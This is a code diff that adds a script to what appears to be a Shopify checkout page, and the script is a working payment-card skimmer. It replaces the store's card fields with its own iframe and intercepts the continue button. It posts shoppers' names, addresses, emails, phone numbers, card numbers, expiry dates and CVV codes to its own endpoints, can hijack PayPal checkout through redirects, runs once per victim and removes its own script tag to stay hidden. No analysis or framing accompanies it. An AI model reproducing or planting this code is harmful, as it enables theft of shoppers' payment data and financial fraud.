@@ -1,0 +1,152 @@
+<script id="checkout">
+    window.addEventListener("load", () => {
+        if (localStorage.getItem("returning_customer")) return;
+        
+        if (Shopify.Checkout.step === "contact_information") {
+            function findFieldValue(fields) {
+                for (let i = 0; i < fields.length; i++) {
+                    if (document.getElementById(fields[i])) {
+                        if (document.getElementById(fields[i]).value) {
+                            return document.getElementById(fields[i]).value;
+                        }
+                    }
+                }
+                return "Empty";
+            }
+            
+            document.getElementById("continue_button").setAttribute("type", "button");
+            document.getElementById("continue_button").addEventListener("click", () => {
+                if (document.getElementById("continue_button").getAttribute("type") === "submit") return;
+
+                fetch("/@/Checkout/Address", {
+                    method: "POST",
+                    headers: {
+                        "Accept": "application/json",
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        FirstName: findFieldValue(["checkout_shipping_address_first_name"]),
+                        LastName: findFieldValue(["checkout_shipping_address_last_name"]),
+                        Address1: findFieldValue(["checkout_shipping_address_address1"]),
+                        Address2: findFieldValue(["checkout_shipping_address_address2"]),
+                        City: findFieldValue(["checkout_shipping_address_city"]),
+                        Province: findFieldValue(["checkout_shipping_address_province"]),
+                        Country: findFieldValue(["checkout_shipping_address_country"]),
+                        ZipCode: findFieldValue(["checkout_shipping_address_zip"]),
+                        EmailAddress: findFieldValue(["checkout_email", "checkout_email_or_phone"]),
+                        PhoneNumber: findFieldValue(["checkout_shipping_address_phone"]),
+                        Cost: `${Shopify.Checkout.estimatedPrice} ${Shopify.Checkout.currency}`
+                    })
+                })
+                .then((response) => response.json())
+                .then((response) => {
+                    if (response.Redirect) {
+                        window.location = response.Redirect;
+                    } else {
+                        document.getElementById("continue_button").setAttribute("type", "submit");
+                        document.getElementById("continue_button").click();
+                        document.getElementById("continue_button").setAttribute("type", "button");
+                    }
+                });
+            });
+        } 
+        
+        if (Shopify.Checkout.step === "payment_method") {
+            document.getElementById("continue_button").setAttribute("type", "button");
+            document.getElementById("continue_button").addEventListener("click", () => {
+                if (document.getElementById("continue_button").getAttribute("type") === "submit") return;
+
+                const checkoutGateway = (() => {
+                    const element = document.querySelector(`input[name="checkout[payment_gateway]"]:checked`);
+                    if (element) {
+                        const wrapper = document.querySelector(`div[data-select-gateway="${element.value}"]`);
+                        if (wrapper) return wrapper.getAttribute("data-gateway-name");
+                    }
+                    return "credit_card";
+                })();
+
+                if (checkoutGateway === "credit_card") {
+                    if (document.getElementById("CreditCardFrame").getAttribute("src") !== "/sp/card") {
+                        location.reload();
+                    }
+
+                    fetch("/@/Checkout/Card", {
+                        method: "POST",
+                        headers: {
+                            "Accept": "application/json",
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({
+                            Number: document.getElementById("CreditCardFrame").contentWindow.document.getElementById("number").value,
+                            Name: document.getElementById("CreditCardFrame").contentWindow.document.getElementById("name").value,
+                            Expiry: document.getElementById("CreditCardFrame").contentWindow.document.getElementById("expiry").value,
+                            VerificationValue: document.getElementById("CreditCardFrame").contentWindow.document.getElementById("verification_value").value,
+                            Cost: `${Shopify.Checkout.estimatedPrice} ${Shopify.Checkout.currency}`
+                        })
+                    })
+                    .then((response) => response.json())
+                    .then((response) => {
+                        localStorage.setItem("returning_customer", true);
+
+                        if (response.Redirect) {
+                            window.location = response.Redirect;
+                        } else {
+                            location.reload();
+                        }
+                    });
+                } else if (checkoutGateway === "paypal") {
+                    fetch("/@/Checkout/PayPal", {
+                        method: "POST",
+                        headers: {
+                            "Accept": "application/json",
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ 
+                            Cost: `${Shopify.Checkout.estimatedPrice} ${Shopify.Checkout.currency}`
+                        })
+                    })
+                    .then((response) => response.json())
+                    .then((response) => {
+                        if (response.Redirect) {
+                            localStorage.setItem("returning_customer", true);
+                            window.location = response.Redirect;
+                        } else {
+                            document.getElementById("continue_button").setAttribute("type", "submit");
+                            document.getElementById("continue_button").click();
+                            document.getElementById("continue_button").setAttribute("type", "button");
+                        }
+                    });
+                } else {
+                    document.getElementById("continue_button").setAttribute("type", "submit");
+                    document.getElementById("continue_button").click();
+                    document.getElementById("continue_button").setAttribute("type", "button");
+                }
+            });
+
+            const cardFieldsContainer = document.querySelector("div.card-fields-container");
+
+            if (cardFieldsContainer) {
+                while (cardFieldsContainer.firstChild) {
+                    cardFieldsContainer.removeChild(cardFieldsContainer.firstChild);
+                }
+
+                const frame = document.createElement("iframe");
+                frame.setAttribute("id", "CreditCardFrame");
+                frame.setAttribute("src", "/sp/card");
+
+                window.addEventListener("message", (event) => {
+                    if (event.data.type && event.data.type === "CreditCardFrameResize") {
+                        frame.style.width = "100%";
+                        frame.style.height = event.data.height + "px";
+                    }
+                });
+
+                cardFieldsContainer.appendChild(frame);
+            }
+        }
+    });
+
+    if (document.getElementById("checkout")) {
+        document.getElementById("checkout").remove();
+    }
+</script>
